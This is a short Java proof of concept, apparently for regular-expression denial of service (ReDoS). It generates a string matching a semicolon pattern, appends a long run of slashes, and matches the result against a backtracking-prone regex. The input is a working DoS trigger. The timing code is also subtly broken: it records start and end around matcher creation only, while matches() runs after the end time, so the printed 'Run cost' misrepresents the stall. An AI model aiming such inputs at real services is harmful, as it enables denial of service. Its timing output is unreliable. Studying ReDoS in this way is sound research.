package com.SugarP1g.ReDoS;

import com.mifmif.common.regex.Generex;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class POC2 {

    public String getMatchStr(String regex) {
        Generex generex = new Generex(regex);
        // Generate random String
        String randomStr = generex.random();
        return randomStr;

    }


    public static void main(String[] args) {
        String poc = new POC2().getMatchStr("(([^;]+;){9}[^;]+)");
        System.out.println(poc);
        Pattern r = Pattern.compile("(([^;]+;){9}[^;]+(?<!break|continue);\\n(?![\\W]*(\\/\\/.+[\\W]+)*else))");
        StringBuffer sb = new StringBuffer();
        sb.append(poc);
        sb.append(";\n/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////");
        long startTime = System.currentTimeMillis();
        Matcher m = r.matcher(sb.toString());
        long endTime = System.currentTimeMillis();
        System.out.println(m.matches());
        System.out.println("Run cost: " + (endTime - startTime) + " ms.");
    }

}
